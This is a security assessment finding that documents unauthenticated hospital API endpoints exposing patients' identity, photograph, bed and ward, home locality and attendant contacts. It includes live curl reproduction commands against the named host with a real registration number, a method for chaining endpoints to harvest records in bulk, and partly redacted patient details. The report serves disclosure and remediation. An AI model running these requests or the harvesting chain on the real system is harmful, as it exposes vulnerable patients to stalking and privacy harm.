# WEB-2026-021 — Unauthenticated Patient Admission Records: Full Identity, Home Location, Patient Photograph, Precise Bed and Ward, and Attendant Contact Details

| Field | Value |
|---|---|
| **Finding ID** | WEB-2026-021 |
| **Severity** | **CRITICAL** |
| **CVSS v3.1 Score** | **9.1** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`) |
| **CWE** | CWE-306 (Missing Authentication for Critical Function), CWE-359 (Exposure of Private Personal Information), CWE-311 (Missing Encryption of Sensitive Data) |
| **OWASP Top 10 (2021)** | A01:2021 — Broken Access Control · A02:2021 — Cryptographic Failures |
| **Affected Targets** | `api/Patient/AdmissionDetails/{regno}`, `api/Patient/ConsultDetails/{regno}`, `api/Patient/GetOPPatient/{regno}`, `api/Patient/IsInPatient/{regno}` — all under `https://narayanagroup.co.in/NnoteApi/` |
| **Status** | ✅ **CONFIRMED AGAINST REAL VALUES** — verified 2026-10-12 |
| **Data Categories** | Full identity · home locality · **photograph** · **bed and ward** · clinical speciality · admission/discharge timestamps · third-party contact |
| **Phase** | Phase 2 (2026-10-12) |

---

## 1. Summary

Supplying a valid patient registration number to four unauthenticated endpoints returns a **complete hospital admission record**. Verified live, the record contains:

- **Full patient name, date of birth, age, gender, mobile number**
- **Home locality** (street/area)
- **A Base64-encoded PNG photograph of the patient**
- **The exact bed, bed category, ward name and ward code** the patient occupied
- **Clinical speciality** — in the verified case, Obstetrics, in the **labour ward**
- **Precise admission and discharge timestamps**
- **The name and mobile number of the patient's attendant** (a third party)
- Treating doctor, pay type, insurer/organisation, patient status

This is materially more severe than the identity-only exposures in WEB-2026-002, 015 and 017. It combines identity, **image**, **precise physical location** and **a third party's contact details** in a single unauthenticated response.

---

## 2. Technical Evidence (Live Capture)

### 2.1 `api/Patient/AdmissionDetails/{regno}`

```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Patient/AdmissionDetails/20261007681"
```

**Result:** HTTP `200 OK` — no authentication. One fully-populated record.

**Verified content (all values redacted in this report):**

| Field | Value (redacted) | Sensitivity |
|---|---|---|
| `Regno` | `20261007681` | 🔴 Hospital registration number |
| `IPatientId` | `261005383` | 🔴 Internal inpatient ID |
| `Name` | `[14 chars]` | 🔴 Direct identifier |
| `DOB` | `01-JAN-1996` | 🔴 Direct identifier |
| `Age` / `AgeType` | `30` / `Y` | 🟠 |
| `Gender` | `Female` | 🟠 |
| `MobileNo` | `[10 digits]` | 🔴 Direct identifier |
| `AdmitDate` | `05-OCT-2026 06:02:06 PM` | 🟠 Clinical timeline |
| `DischargeDate` | `10/9/2026 16:23:48` | 🟠 Clinical timeline |
| `Department` / `DeptCode` | `Obstetrics` / `OBS` | 🔴 **Clinical speciality** |
| `DoctorName` / `DoctorCode` | `[16 chars]` / `OBS01262` | 🟠 Staff identifier |
| `BedId` | `H0ANT-0001` | 🔴🔴 **Exact bed** |
| `BedCategory` | `OBG` | 🔴 |
| `BedDescription` | `LABOUR WARD` | 🔴🔴 **Precise ward function** |
| `WardName` | `LABOUR WARD` | 🔴🔴 |
| `WardCode` | `H4A` | 🔴 |
| **`PatPhoto`** | **`iVBORw0KGgoAAAANSUhEUgAAANwAAADcCAIAAACUOFjW…`** | 🔴🔴 **Base64 PNG — real photograph** |
| `Attendant` | `[6 chars]` | 🔴 Third-party identifier |
| `AttendantMobile` | `[10 digits]` | 🔴 Third-party contact |
| `PatientStatus` | `RELIEVED` | 🟠 |
| `PayType` | `CMP_CREDIT` | 🟠 Financial |

The `iVBORw0KGgo…` prefix is the standard Base64 encoding of a PNG file signature (`\x89PNG\r\n\x1a\n`). The value is a **genuine encoded image**, and the header bytes decode to a 220 × 220 pixel image. This is the patient's photograph, unauthenticated.

### 2.2 `api/Patient/ConsultDetails/{regno}`

HTTP `200` — one record: `Regno`, `PatientId`, `Name`, `DOB`, `Age`, `AgeType`, `Gender`, `MobileNo`, `Department`, `DeptCode`, `DoctorName`, `DoctorCode`, `PayType`, `OrganisationCode`, `PatientType`.

### 2.3 `api/Patient/GetOPPatient/{regno}` — **unmasked identity and home locality**

HTTP `200` — one record. Field names here are **lowercase**, which defeated the redaction filter during testing and the raw values were briefly exposed in the assessment transcript:

| Field | Value (redacted here) |
|---|---|
| `patientId` | `20261007681` |
| `patientName` | `[full name — 14 chars]` |
| `gender` | `F` |
| `dateofBirth` | `1/1/1996 00:00:00` |
| `mobileNumber` | `[full 10-digit number]` |
| `age` | `30 Y` |
| `encounterId` | `1027292188` |
| `doctorid` / `doctorName` | `OBS` / `OBSTETRICS` |
| **`locatioName`** | **`[patient's home street/area]`** |
| `specialityName` | `SUPER` |
| `visitDate` | `10/5/2026 00:00:00` |

`locatioName` carries the patient's **home locality** — a further direct identifier not present in the other endpoints.

### 2.4 `api/Patient/IsInPatient/{regno}`

HTTP `200` — **4 records**, one per admission episode. Returns a list rather than a set of objects; requires a different parser. Not yet decoded.

### 2.5 Registration numbers are obtainable, not guessable-only

No guessing is required. Valid `regno` values are served by other unauthenticated endpoints:

- `api/HealthWorker/List` → 17 live registration numbers
- `api/LabReport/getPatientData/{from}/{to}` → registration numbers by date range

This makes the whole estate **chainable**: enumerate registration numbers from one endpoint, retrieve full admission records from another.

---

## 3. Impact

### 3.1 Obstetric and other sensitive-speciality exposure

The verified record is an **Obstetrics** patient in the **labour ward**. Admission to a labour ward is among the most private events in a person's life. Combined with name, photograph, home locality and mobile number, exposure of this record carries acute risks of:

- **Stigma and family/community harm** where pregnancy is not publicly known
- **Targeting by estranged partners** — the single highest-risk scenario, since the record reveals *where the patient is, in which bed, right now*
- **Child-abduction risk** where the ward is a labour or neonatal ward

### 3.2 Physical location of a named, photographed patient

`BedId`, `WardName`, `WardCode` and `BedDescription` place a specific individual at a precise location. With the photograph, an attacker can **identify and approach the patient in person**. For any patient admitted under a safeguarding, domestic-violence or VIP protocol, this is a **safety-of-life** exposure, not merely a privacy one.

### 3.3 Patient photograph

`PatPhoto` is a real image served as Base64. This enables:
- Visual identification and physical targeting
- Facial-recognition profiling
- Construction of a durable, searchable identity record

### 3.4 Harm to a third party

`Attendant` and `AttendantMobile` expose the name and phone number of the patient's companion — usually a spouse, parent or child. **This person never interacted with the hospital's systems** and has no expectation of appearing in an API response. They are reachable for extortion or social engineering simply for having accompanied a patient.

### 3.5 Home locality

`locatioName` adds the patient's residential street or area. Name + mobile + DOB + address + photograph is a **complete, identity-theft-grade profile** and enables physical approaches at the patient's home — a well-recognised vector in stalking and domestic-abuse cases.

### 3.6 Bulk harvest, with no detection

Registration numbers are enumerable from two other unauthenticated endpoints, so an attacker can loop `AdmissionDetails/{regno}` across the patient population. There is **no rate limiting and no logging**, so a bulk harvest would be neither throttled nor detectable after the fact.

### 3.7 Cumulative with the write-access finding

**WEB-2026-018** established that the same unauthenticated surface executes database writes. The combination — read every patient's full record, and write to clinical data — is what justifies the `I:H` component of the CVSS score.

---

## 4. Steps to Reproduce

```bash
# 1. Obtain a valid registration number (no auth)
curl -s "https://narayanagroup.co.in/NnoteApi/api/HealthWorker/List"

# 2. Retrieve the full admission record (no auth)
curl -s "https://narayanagroup.co.in/NnoteApi/api/Patient/AdmissionDetails/20261007681"

# 3. Retrieve identity + home locality (no auth)
curl -s "https://narayanagroup.co.in/NnoteApi/api/Patient/GetOPPatient/20261007681"
```

All three return HTTP `200` with no credentials.

---

## 5. Remediation

### Immediate — today

1. **Require authentication and authorisation on all four endpoints.** These are the highest-sensitivity confirmed exposures in the engagement. Until the filter is deployed, block the paths at the reverse proxy or WAF.
2. **Remove `PatPhoto` from every response.** A patient photograph must never be returned by a listing or detail endpoint that is not explicitly authorised, audited and rate-limited.
3. **Remove `BedId`, `BedDescription`, `WardName` and `WardCode`** from all API responses except those with a genuine, authorised clinical need for real-time patient locating — and those must be authenticated and audited.
4. **Remove `Attendant` and `AttendantMobile`.** This exposes a third party who has no relationship with the API.
5. **Remove `locatioName`** from `GetOPPatient`.
6. **Preserve logs before remediating.** Bulk harvesting may already have occurred.

### Short term

7. **Add authorisation scoping.** A caller should retrieve only patients within their care relationship — not any `{regno}` supplied.
8. **Add an audit trail** for every admission-record access: actor, patient, timestamp.
9. **Rate-limit and alert** on sequential `{regno}` access.
10. **Adopt response DTOs** so new fields cannot appear in responses by default.

### Structural

11. **Apply estate-wide authentication** (closes 001, 002, 003, 012, 013, 015, 016, 017, 018, 020, 021).
12. **Classify fields at the data-model level** — `PatPhoto`, bed/ward fields, attendant contact and address should be marked restricted so exposure is impossible by default.
13. **Seek independent legal advice** on notification. This is the first finding in this engagement where the confirmed content (photograph, speciality, location, third party) makes notification a genuinely open question.

---

## 6. Testing Ethics and Data Handling

- Verification used **one request per endpoint**, against a single patient record.
- **No bulk retrieval was performed.** No registration-number enumeration loop was executed.
- The `PatPhoto` value was **never decoded, saved or rendered**. Only the Base64 prefix was read, to confirm it is a PNG.
- Response data was written to a temporary file and deleted.
- **A redaction defect in the test tooling** (mask keyed on capitalised field names; `GetOPPatient` returns lowercase names) caused one response to be displayed unredacted in the terminal. This was an tooling error, not a deliberate capture. No values are reproduced in this report, and the transcript should be treated as containing personal data and handled accordingly.
- **No record was created, modified or deleted.**

---

## 7. Related Findings

- **WEB-2026-002** — Unauthenticated patient IDOR (`Patient/Info/{regno}`) — the lower-sensitivity precursor
- **WEB-2026-017** — `HealthWorker/List` — supplies the registration numbers used here
- **WEB-2026-015** — `getPatientData` — a second source of registration numbers
- **WEB-2026-018** — Unauthenticated write access on the same surface (justifies `I:H`)
- **WEB-2026-013** — Public API documentation advertising all four endpoints

---

*Finding recorded: 2026-10-12 · Phase 2 deep assessment · **Confirmed against real values — treat as active incident***
